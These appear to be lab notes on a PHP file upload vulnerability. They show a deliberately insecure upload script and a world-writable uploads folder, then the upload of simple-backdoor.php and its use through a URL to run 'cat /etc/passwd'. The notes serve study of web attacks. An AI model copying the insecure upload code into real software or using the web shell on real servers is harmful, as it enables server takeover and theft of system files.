File Upload Vulnerability

**********************************************************************************************************************************

Attacker abuses a file upload feature to upload malicious script
Script is executed and allows for further attacks -> webshell
Filters based on Content-Type, Extension names, Size etc.

**********************************************************************************************************************************

Set the permissions

$ chmod 777 uploads/

**********************************************************************************************************************************

root@kali:/var/www/file_upload/basic# cat upload.php
<html>
<body>

<h3>Image File Upload Stats: </h3>

<?php

        if($_FILES["file"]["error"])
        {
                header("Location: file.html");
                die();
        }
        else{

                echo "Name: ".$_FILES["file"]["name"];
                echo "<br>Size: ".$_FILES["file"]["size"];
                echo "<br>Temp File: ".$_FILES["file"]["tmp_name"];

                move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/".$_FILES["file"]["name"]);
        }


?>

</body>
</html>


root@kali:/var/www/file_upload/basic#

Upload simple-backdoor.php
http://localhost/file-upload-basic/file_upload/basic/uploads/simple-backdoor.php
Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
http://localhost/file-upload-basic/file_upload/basic/uploads/simple-backdoor.php?cmd=cat+/etc/passwd

**********************************************************************************************************************************
